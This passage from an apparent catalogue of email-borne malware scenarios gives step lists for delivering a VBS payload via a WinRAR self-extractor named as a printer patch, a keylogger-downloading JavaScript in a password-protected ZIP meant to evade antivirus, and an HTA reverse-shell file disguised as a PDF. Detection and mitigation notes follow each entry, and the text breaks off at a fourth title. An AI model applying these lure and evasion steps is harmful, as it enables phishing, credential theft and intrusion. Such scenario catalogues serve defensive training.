Attack Steps: Step 1: Create WinRAR self-extracting archive with VBS script.Step 2: Configure it to auto-execute VBS on extraction.Step 3: Name it “PrinterDriverUpdate.exe”.Step 4: Send email from fake IT address: “Mandatory Patch – Fixes Printing”.Step 5: Victim runs EXE thinking it’s legit.Step 6: SFX silently runs the VBS.Step 7: Malware dropped and launched.
Vulnerability: Lack of sandboxing, trust in patches
Detection Method: Heuristics for SFX archives, user behavior
Solution: Block EXEs in email, restrict SFX behavior

Title: JavaScript Exploit via Encrypted Attachment
Scenario Description: Malicious JavaScript file sent inside a password-protected ZIP to bypass AV scanning. Victim is given password in the email.
Attack Steps: Step 1: JS file created to download and install keylogger.Step 2: File zipped with password (e.g., “1234”) using WinRAR.Step 3: Email body says “Invoice attached, password: 1234”.Step 4: Victim opens ZIP using given password.Step 5: Runs JS script.Step 6: Keylogger is downloaded and installed.Step 7: Logs sent to attacker.
Detection Method: Monitor JS execution, ZIP attachment usage
Solution: Block encrypted ZIPs, educate staff

Title: HTA File Masked as PDF
Scenario Description: HTA file renamed to “filename.pdf.hta” and disguised with a PDF icon. Users fooled into thinking it’s a regular document.
Attack Steps: Step 1: HTA payload crafted to run reverse shell.Step 2: File renamed “PolicyUpdate.pdf.hta”.Step 3: PDF icon applied using resource hacker.Step 4: Sent in email as “New HR Policy”.Step 5: Victim sees PDF-looking icon and double-clicks.Step 6: HTA executes PowerShell to connect to C2.Step 7: Attacker receives shell.
Detection Method: File extension filter, sandbox testing
Solution: Show extensions, block HTA

Title: Multi-Stage JS Downloader with Persistence
